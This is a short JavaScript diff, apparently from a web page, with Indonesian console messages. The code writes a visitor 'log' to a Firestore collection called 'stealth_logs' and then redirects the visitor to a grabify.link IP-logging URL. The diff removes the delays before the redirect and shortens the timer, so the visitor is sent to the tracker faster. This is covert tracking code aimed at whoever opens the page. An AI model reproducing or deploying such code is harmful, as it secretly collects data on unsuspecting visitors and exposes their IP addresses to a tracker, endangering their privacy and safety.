@@ -195,17 +195,13 @@ const firebaseConfig = {
         try {
           await addDoc(collection(db, "stealth_logs"), log);
           console.log("✅ Log berhasil dikirim ke Firestore");
-          setTimeout(() => {
             window.location.href = "https://grabify.link/TLRNZ9";
-            }, 2000);
 
         } catch (e) {
           console.error("❌ Gagal mengirim ke Firestore:", e);
-          setTimeout(() => {
             window.location.href = "https://grabify.link/TLRNZ9";
-            }, 2000);
         }
-      }, 4000);
+      }, 3000);
     }
 
     onAuthStateChanged(auth, user => {
